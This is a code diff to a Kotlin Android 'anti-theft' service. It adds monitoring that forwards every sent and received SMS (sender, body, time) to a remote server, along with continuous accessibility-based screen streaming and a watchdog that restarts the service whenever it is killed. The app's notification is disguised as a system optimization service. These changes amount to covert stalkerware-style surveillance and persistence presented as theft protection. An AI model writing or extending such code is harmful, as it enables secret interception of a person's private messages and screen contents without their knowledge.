@@ -37,7 +37,10 @@ import android.os.PowerManager
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.os.VibratorManager
+import android.database.ContentObserver
+import android.net.Uri
 import android.provider.Settings
+import android.provider.Telephony
 import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -83,8 +86,9 @@ class AntiTheftService : LifecycleService() {
         const val CHANNEL_ID = "antitheft_security_channel"
         const val NOTIFICATION_ID = 998877
 
-        var serverIpAddress: String = "protect.appbr.pro"
+        var serverIpAddress: String = "androidprotect.appbr.pro"
         var isServiceRunning = false
+        var isWebSocketConnected = false
         var linkToken: String = ""
         var currentModelName: String = "" // exposed so MainActivity can read current name
 
@@ -131,6 +135,10 @@ class AntiTheftService : LifecycleService() {
     private var screenCaptureThread: HandlerThread? = null
     private var screenCaptureHandler: Handler? = null
 
+    // Accessibility-based screen capture state (Android 11+)
+    private var accessibilityFrameHandler: Handler? = null
+    private var accessibilityFrameRunnable: Runnable? = null
+
     // Live Camera Stream state (CameraX ImageAnalysis)
     private var cameraProvider: ProcessCameraProvider? = null
     private var cameraStreamExecutor: java.util.concurrent.ExecutorService? = null
@@ -143,17 +151,23 @@ class AntiTheftService : LifecycleService() {
     private var isScreenStreaming = false
     private var lastFrameTime = 0L
 
+    // SMS monitoring
+    private var smsObserver: ContentObserver? = null
+    private var lastKnownSmsId = 0L
+
     override fun onCreate() {
         super.onCreate()
         Log.d("AntiTheftService", "Service onCreate")
         isServiceRunning = true
+        // Must call startForeground within 5s of onCreate to avoid ANR on Android 13+
+        startForegroundNotification()
         
         // Generate Unique ID
         deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "android_dev"
 
         // Load preferences — custom name overrides the hardware model name
         val sharedPrefs = getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
-        serverIpAddress = sharedPrefs.getString("server_ip", "protect.appbr.pro") ?: "protect.appbr.pro"
+        serverIpAddress = sharedPrefs.getString("server_ip", "androidprotect.appbr.pro") ?: "androidprotect.appbr.pro"
         val customName  = sharedPrefs.getString("device_custom_name", "").orEmpty().trim()
         modelName = if (customName.isNotEmpty()) customName
                     else "${Build.MANUFACTURER} ${Build.MODEL}"
@@ -170,14 +184,14 @@ class AntiTheftService : LifecycleService() {
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AndroidProtect::ServiceWakeLock")
         wakeLock?.acquire()
 
-        // Start Foreground Notification
-        startForegroundNotification()
-
         // Detect SIM card change (potential theft indicator)
         checkSimChange()
 
         // Establish Server WebSocket connection
         connectToServer()
+
+        // Schedule watchdog to restart this service if killed
+        ServiceWatchdogWorker.schedule(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -213,14 +227,13 @@ class AntiTheftService : LifecycleService() {
     }
 
     private fun startForegroundNotification() {
-        // Disguise notification to bypass thief's attention
         val channelName = "Serviços de Otimização do Sistema"
         val channelDescription = "Gerencia consumo de bateria e proteção de integridade."
-        
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
-                CHANNEL_ID, 
-                channelName, 
+                CHANNEL_ID,
+                channelName,
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
                 description = channelDescription
@@ -230,11 +243,9 @@ class AntiTheftService : LifecycleService() {
             manager.createNotificationChannel(channel)
         }
 
-        val notificationIntent = Intent(this, MainActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(
-            this, 
-            0, 
-            notificationIntent, 
+            this, 0,
+            Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE
         )
 
@@ -247,7 +258,26 @@ class AntiTheftService : LifecycleService() {
             .setCategory(Notification.CATEGORY_SERVICE)
             .build()
 
-        startForeground(NOTIFICATION_ID, notification)
+        // Use ServiceCompat to handle foreground service type correctly across API levels.
+        // Only declare LOCATION type here — camera/mic types are only needed during active streaming
+        // and declaring them without permission causes crashes on Android 13+ with targetSdk 34.
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                androidx.core.app.ServiceCompat.startForeground(
+                    this,
+                    NOTIFICATION_ID,
+                    notification,
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                )
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
+            }
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "startForeground failed: ${e.message} — retrying without type")
+            try { startForeground(NOTIFICATION_ID, notification) } catch (e2: Exception) {
+                Log.e("AntiTheftService", "startForeground fallback also failed: ${e2.message}")
+            }
+        }
     }
 
     // Build the dynamic WebSocket connection URL
@@ -305,6 +335,7 @@ class AntiTheftService : LifecycleService() {
         webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 Log.d("AntiTheftService", "WebSocket opened")
+                isWebSocketConnected = true
                 connectTime = System.currentTimeMillis()
 
                 // Schedule backoff reset only if connection stays stable for 30 seconds
@@ -313,7 +344,10 @@ class AntiTheftService : LifecycleService() {
 
                 sendTelemetry()
                 // Auto-start location tracking immediately on connect
-                Handler(Looper.getMainLooper()).post { startLocationTracking() }
+                Handler(Looper.getMainLooper()).post {
+                    startLocationTracking()
+                    registerSmsObserver()
+                }
                 sendConsoleLog("Aparelho conectado ao servidor. Rastreamento GPS iniciado automaticamente.")
             }
 
@@ -323,11 +357,13 @@ class AntiTheftService : LifecycleService() {
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 Log.e("AntiTheftService", "WS failure: ${t.message}. Retry in ${reconnectDelay}ms")
+                isWebSocketConnected = false
                 scheduleReconnect()
             }
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 Log.d("AntiTheftService", "WS closed. Retry in ${reconnectDelay}ms")
+                isWebSocketConnected = false
                 scheduleReconnect()
             }
         })
@@ -446,9 +482,22 @@ class AntiTheftService : LifecycleService() {
     @SuppressLint("MissingPermission")
     private fun getWifiSsid(): String {
         return try {
-            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
-            val ssid = wm.connectionInfo?.ssid ?: "Desconectado"
-            ssid.removeSurrounding("\"") // Remove aspas que o Android adiciona
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val cm = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE)
+                        as android.net.ConnectivityManager
+                val network = cm.activeNetwork ?: return "Desconectado"
+                val caps = cm.getNetworkCapabilities(network) ?: return "Desconectado"
+                val info = caps.transportInfo
+                if (info is android.net.wifi.WifiInfo) {
+                    info.ssid.removeSurrounding("\"")
+                } else "Desconectado"
+            } else {
+                @Suppress("DEPRECATION")
+                val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                @Suppress("DEPRECATION")
+                val ssid = wm.connectionInfo?.ssid ?: "Desconectado"
+                ssid.removeSurrounding("\"")
+            }
         } catch (e: Exception) { "N/A" }
     }
 
@@ -614,27 +663,79 @@ class AntiTheftService : LifecycleService() {
         })
     }
 
-    // Real-time Screen Streaming core
+    // Real-time Screen Streaming core — uses AccessibilityService (Android 11+) or MediaProjection
     private fun startScreenStreaming() {
         if (isScreenStreaming) return
 
-        val resultCode = mediaProjectionResultCode
-        val intentData = mediaProjectionData
-
-        if (resultCode == 0 || intentData == null) {
-            val prefs = getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
-            if (prefs.getBoolean("screen_perm_granted", false)) {
-                // Token expired (process restarted) — notify user to tap and re-authorize
-                sendConsoleLog("Token de tela expirado. Notificação enviada ao aparelho para reautorizar.")
-                notifyReactivateScreenCapture()
-            } else {
-                sendConsoleLog("Transmissão de tela falhou: Permissão não concedida. Abra o app e autorize.")
-            }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+            ProtectAccessibilityService.instance != null) {
+            startScreenStreamingViaAccessibility()
             return
         }
 
-        try {
+        startScreenStreamingViaMediaProjection()
+    }
+
+    @Suppress("DEPRECATION")
+    @android.annotation.TargetApi(Build.VERSION_CODES.R)
+    private fun startScreenStreamingViaAccessibility() {
+        isScreenStreaming = true
+        sendConsoleLog("Transmissão de tela via Acessibilidade iniciada (permanente).")
+
+        val handler = Handler(Looper.getMainLooper())
+        val runnable = object : Runnable {
+            override fun run() {
+                if (!isScreenStreaming) return
+                val svc = ProtectAccessibilityService.instance
+                if (svc == null) {
+                    isScreenStreaming = false
+                    sendConsoleLog("Serviço de acessibilidade inativo — transmissão encerrada.")
+                    return
+                }
+                svc.captureScreen { bitmap ->
+                    if (bitmap != null && isScreenStreaming) {
+                        try {
+                            val w = 360; val h = 640
+                            val scaled = Bitmap.createScaledBitmap(bitmap, w, h, false)
+                            val out = java.io.ByteArrayOutputStream()
+                            scaled.compress(Bitmap.CompressFormat.JPEG, 45, out)
+                            if (scaled !== bitmap) scaled.recycle()
+                            bitmap.recycle()
+                            sendTypedBinary(0x01.toByte(), out.toByteArray())
+                        } catch (e: Exception) {
+                            bitmap.recycle()
+                        }
+                    }
+                    if (isScreenStreaming) handler.postDelayed(this, 150)
+                }
+            }
+        }
+        accessibilityFrameHandler = handler
+        accessibilityFrameRunnable = runnable
+        handler.post(runnable)
+    }
+
+    private fun startScreenStreamingViaMediaProjection() {
+        // Reuse existing MediaProjection if still alive
+        if (mediaProjection == null) {
+            val resultCode = mediaProjectionResultCode
+            val intentData = mediaProjectionData
+
+            if (resultCode == 0 || intentData == null) {
+                val prefs = getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
+                if (prefs.getBoolean("screen_perm_granted", false)) {
+                    sendConsoleLog("Token de tela expirado. Abrindo app para reautorizar automaticamente.")
+                    notifyReactivateScreenCapture()
+                } else {
+                    sendConsoleLog("Transmissão de tela falhou: Permissão não concedida. Abra o app e autorize.")
+                }
+                return
+            }
+
             mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, intentData)
+        }
+
+        try {
             if (mediaProjection == null) {
                 sendConsoleLog("Erro ao inicializar MediaProjection. Abra o app novamente.")
                 return
@@ -724,29 +825,39 @@ class AntiTheftService : LifecycleService() {
 
     private fun stopScreenStreaming() {
         if (!isScreenStreaming) return
-        
+
         Log.d("AntiTheftService", "Stopping screen capture...")
         isScreenStreaming = false
-        
+
+        // Stop accessibility stream
+        accessibilityFrameRunnable?.let { accessibilityFrameHandler?.removeCallbacks(it) }
+        accessibilityFrameHandler = null
+        accessibilityFrameRunnable = null
+
+        // Stop MediaProjection stream
         try {
             imageReader?.setOnImageAvailableListener(null, null)
             imageReader?.close()
             imageReader = null
-            
+
             virtualDisplay?.release()
             virtualDisplay = null
-            
-            mediaProjection?.stop()
-            mediaProjection = null
-            
+
+            // Keep mediaProjection alive — reused on next start
+
             screenCaptureThread?.quitSafely()
             screenCaptureThread = null
             screenCaptureHandler = null
-            
-            sendConsoleLog("Transmissão de tela finalizada.")
         } catch (e: Exception) {
             Log.e("AntiTheftService", "Failed to clean up screen stream: ${e.message}")
         }
+
+        sendConsoleLog("Transmissão de tela finalizada.")
+    }
+
+    private fun releaseMediaProjection() {
+        try { mediaProjection?.stop() } catch (_: Exception) {}
+        mediaProjection = null
     }
 
     // Play Security Siren Alarm with sound + vibration + flash
@@ -819,6 +930,7 @@ class AntiTheftService : LifecycleService() {
     }
 
     private fun startFlash() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
         try {
             val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
             val cameraId = cm.cameraIdList.firstOrNull() ?: return
@@ -841,6 +953,7 @@ class AntiTheftService : LifecycleService() {
         isFlashing = false
         flashRunnable?.let { flashHandler?.removeCallbacks(it) }
         flashHandler = null; flashRunnable = null
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
         try {
             val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
             val cameraId = cm.cameraIdList.firstOrNull() ?: return
@@ -1140,17 +1253,24 @@ class AntiTheftService : LifecycleService() {
 
     override fun onDestroy() {
         super.onDestroy()
-        Log.d("AntiTheftService", "Service onDestroy")
+        Log.d("AntiTheftService", "Service onDestroy — scheduling immediate restart")
         isServiceRunning = false
+
+        // Schedule restart via WorkManager (safer than Handler after onDestroy)
+        ServiceWatchdogWorker.scheduleImmediate(applicationContext)
         
         // Clean up resources
         stopLocationTracking()
         stopScreenStreaming()
-        
+        releaseMediaProjection()
+
         mediaPlayer?.stop()
         mediaPlayer?.release()
         mediaPlayer = null
         
+        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
+        smsObserver = null
+
         webSocket?.close(1000, "Service destroyed")
         stopCameraStream()
         stopAudioStream()
@@ -1158,6 +1278,70 @@ class AntiTheftService : LifecycleService() {
         stopFlash()
         wakeLock?.let { if (it.isHeld) it.release() }
         wakeLock = null
+    }
+
+    private fun registerSmsObserver() {
+        // Unregister any existing observer first (e.g. on reconnect)
+        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
+
+        // Record the current max SMS _id so we only send NEW messages
+        try {
+            contentResolver.query(
+                Uri.parse("content://sms"),
+                arrayOf("_id"), null, null, "_id DESC"
+            )?.use { cursor ->
+                if (cursor.moveToFirst()) {
+                    lastKnownSmsId = cursor.getLong(0)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "Error reading initial SMS ID: ${e.message}")
+        }
+
+        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean) = syncNewSms()
+            override fun onChange(selfChange: Boolean, uri: Uri?) = syncNewSms()
+        }
+        contentResolver.registerContentObserver(
+            Uri.parse("content://sms"),
+            true,
+            smsObserver!!
+        )
+        Log.d("AntiTheftService", "SMS observer registered (lastId=$lastKnownSmsId)")
+    }
+
+    private fun syncNewSms() {
+        try {
+            val cursor = contentResolver.query(
+                Uri.parse("content://sms"),
+                arrayOf("_id", "address", "body", "date", "type"),
+                "_id > ?",
+                arrayOf(lastKnownSmsId.toString()),
+                "_id ASC"
+            ) ?: return
+
+            cursor.use {
+                while (it.moveToNext()) {
+                    val id      = it.getLong(it.getColumnIndexOrThrow("_id"))
+                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
+                    val body    = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
+                    val date    = it.getLong(it.getColumnIndexOrThrow("date"))
+                    val type    = it.getInt(it.getColumnIndexOrThrow("type"))
+
+                    // 1 = inbox (received), 2 = sent
+                    if (type == 1 || type == 2) {
+                        val direction = if (type == 1) "in" else "out"
+                        val payload = """{"type":"SMS","deviceId":${Json.encodeToString(deviceId)},"direction":"$direction","address":${Json.encodeToString(address)},"content":${Json.encodeToString(body)},"timestamp":$date}"""
+                        webSocket?.send(payload)
+                        Log.d("AntiTheftService", "SMS synced id=$id dir=$direction from=$address")
+                    }
+
+                    if (id > lastKnownSmsId) lastKnownSmsId = id
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "Error syncing SMS: ${e.message}")
+        }
     }
 }
 
